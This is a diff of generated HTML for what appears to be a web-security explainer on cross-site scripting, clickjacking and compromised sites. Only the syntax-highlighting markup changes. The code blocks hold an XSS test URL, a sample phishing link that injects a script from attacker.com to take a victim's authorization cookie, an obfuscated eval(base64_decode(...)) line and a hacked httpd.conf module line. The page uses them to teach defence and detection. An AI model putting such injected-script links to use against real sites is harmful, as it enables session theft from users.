@@ -23,14 +23,14 @@
 &lt;ol&gt;
 &lt;li&gt;The target website perform  query searches that are not sanitized. For example, the query could accept scripts on it. A simple example to check this vulnerability is by verifying whether the alert box with the message &lt;strong&gt;Pwnd&lt;/strong&gt; is displayed:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;http://website.org?q=&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt;&lt;span class="err"&gt;%&lt;/span&gt;&lt;span class="na"&gt;20type=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;text/javascript&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;alert(&amp;#39;Pwnd!&amp;#39;);&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=&amp;lt;script%20type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;Pwnd!&amp;#39;);&amp;lt;/script&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ol&gt;
 &lt;li&gt;The attacker crafts an exploit script that gets the victim's authorization information (for example in an &lt;strong&gt;Authorization Cookie&lt;/strong&gt;). The attacker sends a &lt;strong&gt;phishing email&lt;/strong&gt; to the victim with a link with some script such as:&lt;/li&gt;
 &lt;/ol&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;http://website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//website.org?q=puppies&amp;lt;script%20src=&amp;quot;http://attacker.com/exploit.js&amp;quot;&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -123,7 +123,7 @@
 &lt;h2&gt;Clickjacking&lt;/h2&gt;
 &lt;p&gt;The act of obscuring a portion of a web application so that the victim is not aware that individual clicks are delivered to other site. For example, a malicious site wraps another site in a frame.&lt;/p&gt;
 &lt;p&gt;If a website includes iframe, there is a chance that it can perform a SQL query searching for iframe code. For example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;SELECT * FROM blog_posts WHERE post_text LIKE &amp;#39;%&amp;gt;iframe%&amp;#39;;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;blog_posts&lt;/span&gt; &lt;span class="n"&gt;WHERE&lt;/span&gt; &lt;span class="n"&gt;post_text&lt;/span&gt; &lt;span class="n"&gt;LIKE&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;iframe&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -205,16 +205,16 @@
 &lt;ul&gt;
 &lt;li&gt;Malicious code that is obfuscated to avoid detection:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;eval(base64_decode(&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;));
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;aWYoZnVuaauUl+hasdqetiDi2iOwlOHTgs+slgsfUNlsgasdf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;ul&gt;
 &lt;li&gt;Shared object files designed to randomly write harmful code to otherwise benign scripts:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;#httpd.conf modified by the hacker
-LoadModule harmful_module modules/mod_harmful.so
-AddModule mod_harmful.c
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#httpd.conf modified by the hacker&lt;/span&gt;
+&lt;span class="n"&gt;LoadModule&lt;/span&gt; &lt;span class="n"&gt;harmful_module&lt;/span&gt; &lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;
+&lt;span class="n"&gt;AddModule&lt;/span&gt; &lt;span class="n"&gt;mod_harmful&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -225,7 +225,7 @@ AddModule mod_harmful.c
 &lt;ul&gt;
 &lt;li&gt;Investigate all possible harmful code on the website. It may be helpful to search for words like [iframe] to find iframe code. Other helpful keywords are "script", "eval", and "unescape." For example, on Unix-based systems:&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ &lt;span class="p"&gt;|&lt;/span&gt; less
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -irn &lt;span class="s2"&gt;&amp;quot;iframe&amp;quot;&lt;/span&gt; ./ | less
 &lt;/pre&gt;&lt;/div&gt;
 
 
